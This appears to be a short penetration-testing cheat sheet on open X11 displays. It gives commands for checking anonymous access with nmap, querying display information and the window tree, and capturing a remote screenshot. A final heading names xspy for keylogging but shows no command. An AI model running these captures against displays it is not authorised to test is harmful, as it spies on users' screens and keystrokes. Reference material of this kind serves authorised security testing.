# X11

## recon

### Access check

Check for anonymous X11 access.

```sh title:"Check anonymous X11 access"
nmap -sV --script x11-access -p "$rport" "$rhost_ip"
```
<!-- cheat
var rhost_ip
var rport := 6000
-->

### Display info

Query X11 display information.

```sh title:"Query X11 display info"
xdpyinfo -display "$rhost_ip:$display"
```

### Window tree

List the X11 root window tree.

```sh title:"List X11 root window tree"
xwininfo -root -tree -display "$rhost_ip:$display"
```

## capture

### Screenshot

Capture an X11 screenshot and convert it to PNG.

```sh title:"Capture X11 screenshot"
xwd -root -screen -silent -display "$rhost_ip:$display" > screenshot.xwd; convert screenshot.xwd screenshot.png
```

var rhost_ip
var display := 0
-->

### Keylog

Capture X11 keystrokes with xspy.

